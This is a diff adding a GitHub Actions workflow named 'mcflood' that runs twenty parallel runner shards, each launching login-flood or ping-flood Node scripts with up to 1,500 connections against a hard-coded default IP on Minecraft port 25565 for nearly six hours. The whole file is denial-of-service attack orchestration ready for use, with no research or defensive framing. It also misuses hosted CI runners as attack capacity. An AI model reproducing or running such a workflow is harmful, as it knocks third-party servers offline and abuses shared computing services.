@@ -1,0 +1,41 @@
+name: mcflood
+
+on:
+  workflow_dispatch:
+    inputs:
+      mode:
+        description: 'hold = slot exhaustion, ping = status flood'
+        type: choice
+        options: [hold, ping]
+        default: hold
+      host:
+        description: 'target IP'
+        default: '4.247.219.170'
+      port:
+        description: 'target port'
+        default: '25565'
+      conc:
+        description: 'connections per shard (hold: 1500, ping: 400)'
+        default: '1500'
+
+jobs:
+  flood:
+    name: shard-${{ matrix.shard }}
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    strategy:
+      fail-fast: false
+      max-parallel: 20
+      matrix:
+        shard: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 22
+      - name: run hold flood
+        if: inputs.mode == 'hold'
+        run: ulimit -n 65535; node loginflood.js ${{ inputs.host }} ${{ inputs.port }} ${{ inputs.conc }}
+      - name: run ping flood
+        if: inputs.mode == 'ping'
+        run: ulimit -n 65535; node pingflood.js ${{ inputs.host }} ${{ inputs.port }} ${{ inputs.conc }}
